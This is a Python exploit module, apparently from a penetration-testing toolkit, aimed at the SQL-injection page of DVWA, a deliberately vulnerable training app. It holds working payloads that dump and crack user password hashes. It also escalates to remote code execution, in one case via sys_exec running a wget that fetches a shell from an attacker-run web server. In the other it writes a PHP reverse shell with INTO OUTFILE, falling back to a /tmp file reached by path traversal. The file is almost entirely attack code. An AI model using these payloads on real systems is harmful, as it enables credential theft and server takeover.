
import requests
import time
import random
from bs4 import BeautifulSoup
from urllib.parse import urljoin , urlparse , urlencode 
from core.common import *
from core.network import *

def dump_creds(url,cookies,headers):
    payload = {
        "id" : "%' and 1=0 union select null, concat(user,0x0a,password) from users #",
        "Submit" : "Submit"
    }

    vulnerable_path = f"vulnerabilities/sqli/?{urlencode(payload)}"
    full_url = urljoin(url,vulnerable_path)

    # send exploit
    html_content = requests.get(full_url,cookies = cookies,headers=headers).content.decode()
    html_parser = BeautifulSoup(html_content,'html.parser')

    for data in html_parser.findAll("pre"):
        result = data.text.split("#")[1]
        userinfo = result.split(":")
        user , hash = userinfo[2].split()
        password = crack_hash(hash)

        print("\t\tTry Crack the hash ...")
        time.sleep(2)

        print(f"\t\tUserName : {user}")

        if not password:
            print("\t\tFailed crack the hash")
            time.sleep(1)
            print(f"\t\tHash     : {hash}\n")

        else:
            print(f"\t\tPassword : {password}\n")


def to_rce(url,cookies,headers,server):

    shell_name = str(random.randint(11111,99999))

    payload = {
        "id" : f"-1' union select sys_exec(\"{wget_payload(lhost=server.host,lport=server.port,shell_name=shell_name)}\"),2 -- -",
        "Submit" : "Submit"
    }

    vulnerable_path = f"vulnerabilities/sqli/?{urlencode(payload)}"
    full_url = urljoin(url,vulnerable_path)

    txtContent = requests.get(full_url,cookies=cookies,headers=headers).text
    time.sleep(2)

    if 'FUNCTION dvwa.sys_exec does not exist' not in txtContent:
        shell_path = urljoin(url,'vulnerabilities/sqli/' + shell_name + '.php')
        check_exploit_succeed(shell_path,headers)

    else:
        print("\t\tExploit Failed")


def to_rce2(url,cookies,headers,server):

    shell_name = str(random.randint(11111,99999))
    shell = php_payload(server.host,server.port,shell_name).replace("'",'"')

    payload = {
        "id" : f"-1' union select '{shell}',2 into outfile '/var/www/dvwa/{shell_name}.php' -- -",
        "Submit" : "Submit"
    }

    vulnerable_path = f"vulnerabilities/sqli/?{urlencode(payload)}"
    full_url = urljoin(url,vulnerable_path)
    txtContent = requests.get(full_url,cookies=cookies,headers=headers).text

    if "Access denied" not in txtContent:
        time.sleep(2)
        shell_path = urljoin(url, shell_name + '.php')

        if "Can't create/write" in txtContent:
            print(f"\t\t{txtContent.replace('</pre>','').replace('<pre>','')}")
            print("\t\tTry to write payload in /tmp and execute it with LFI vulnerability\n")
            payload['id'] = f"-1' union select '{shell}',2 into outfile '/tmp/{shell_name}.txt' -- -"
            vulnerable_path = f"vulnerabilities/sqli/?{urlencode(payload)}"
            full_url = urljoin(url,vulnerable_path)

            txtContent = requests.get(full_url,cookies=cookies,headers=headers).text
            time.sleep(5)

            # execute it to pull shell to the server with lfi exploit
            file = f"../../../../../../../../../tmp/{shell_name}.txt"
            lfi_request_file(url,cookies,headers,file)
            shell_path = urljoin(url,'vulnerabilities/fi/' + shell_name + '.php')


        check_exploit_succeed(shell_path,headers)

    else:
        print("\t\tExploit Failed")

    print()


def exploit(url,cookies = {}):
    print("Try Dvwa SQLi exploit :")

    # Handle Http Server
    
    host = urlparse(url).hostname
    headers = makeHeaders(host)
    ip = ip_on_same_network(host) if ip_on_same_network(host) else get_public_ip()
    port = 8000
    s = WebServer(ip,port)
    s.run()

    # First techniqe

    print("\tDump DVWA Creds :")
    dump_creds(url,cookies,headers)

    # Second techniqe

    print("\tEscalate SQLi to RCE (First techniqe) :")
    to_rce(url,cookies,headers,s)

    # Third techniqe

    print("\n\tEscalate SQLi to RCE (Second techniqe) :")
    to_rce2(url,cookies,headers,s)

    s.stop()    